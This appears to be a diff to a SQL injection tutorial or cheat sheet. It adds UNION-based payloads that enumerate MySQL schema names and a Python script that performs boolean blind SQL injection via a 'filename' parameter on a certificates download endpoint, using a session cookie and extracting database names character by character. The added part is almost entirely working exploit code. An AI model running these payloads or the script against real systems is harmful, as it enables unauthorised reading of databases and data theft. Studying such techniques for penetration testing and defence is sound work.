@@ -362,6 +362,8 @@ Now knowing that the third column is for descriptions, we can put there all info
 ```
 /index.php?id=1 union all select 1, 2, @@version
 /index.php?id=1 union all select 1, 2, user()
+/index.php?id=1 union all select 1, 2, schema_name from information_schema.schemata
+/index.php?id=1 union all select 1, 2, schema_name from information_schema.schemata where schema_name!='information_schema' and schema_name!='performance_schema' and schema_name!='sys' and schema_name!='mysql'
 /index.php?id=1 union all select 1, 2, table_name from information_schema.tables
 /index.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
 /index.php?id=1 union all select 1, username, passwords from users
@@ -547,6 +549,57 @@ for i in range(20):
 print("[!] Finished")
 print("[+] Final results:")
 print(results)
+```
+
+Another example of retrieving databases names:
+
+```python
+import requests
+
+session = requests.Session()
+letters = 'rotasdfghjklzxcvbnmqweyuip_@ZXCVBNMASDFGHJKLQWERTYUIOP=+\'", 0123456789.-$%&*!'
+
+
+# GET LENGTH OF PAYLOAD:
+# Payload: (SELECT table_name from information_schema.tables LIMIT 1 OFFSET 1)
+def get_length(payload):
+	for i in range(1,100):
+		#print("	[!] Length: %s" % i)
+		paramsGet = {"contextid":"189112","filename":"17042023164857_test.pdf' AND LENGTH(%s)=%s-- -" % (payload,i)}
+		headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0","Connection":"close","Sec-Fetch-Dest":"document","Sec-Fetch-Site":"none","Sec-Fetch-User":"?1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate, br","Sec-Fetch-Mode":"navigate"}
+		cookies = {"MoodleSession":"otdcni86r8k5u520fcfh5ump30"}
+		response = session.get("https://example.com/certificates/download.php", params=paramsGet, headers=headers, cookies=cookies)
+		if response.status_code == 200:
+			#print("\t[+]--- Length FOUND : %s" % str(i))
+			return i
+# GET TABLENAME
+# Payload: (SELECT table_name from information_schema.tables LIMIT 1 OFFSET 1)
+# Length: 14
+def get_value(payload, length):
+	out = ''
+	for i in range(1,length+1):
+		for l in letters:
+			paramsGet = {"contextid":"189112","filename":"17042023164857_test.pdf' AND SUBSTRING(%s,%s,1)='%s'-- -" % (payload,i,l)}
+			headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0","Connection":"close","Sec-Fetch-Dest":"document","Sec-Fetch-Site":"none","Sec-Fetch-User":"?1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate, br","Sec-Fetch-Mode":"navigate"}
+			cookies = {"MoodleSession":"otdcni86r8k5u520fcfh5ump30"}
+			response = session.get("https://example.com/certificates/download.php", params=paramsGet, headers=headers, cookies=cookies)
+			if response.status_code == 200:
+				print("\t[+] Letter FOUND : %s" % str(l))
+				out+=l
+				break
+	return out
+
+
+# GET FIRST 10 DATABASES
+for i in range(0,10):
+	print("[!] DATABASE %s" % i)
+	payload = "(SELECT schema_name from information_schema.schemata WHERE schema_name!='information_schema' AND schema_name!='performance_schema' AND schema_name!='sys' AND schema_name!='mysql' LIMIT 1 OFFSET %s)" % str(i)
+	
+	length = get_length(payload)
+	print("\t[+] DATABASE %s LENGTH: %s" %(i, length))
+
+	value = get_value(payload, length)
+	print("\t[+] DATABASE %s VALUE: %s" %(i, value))
 ```
 
 ## Conditional Responses by triggering SQL errors
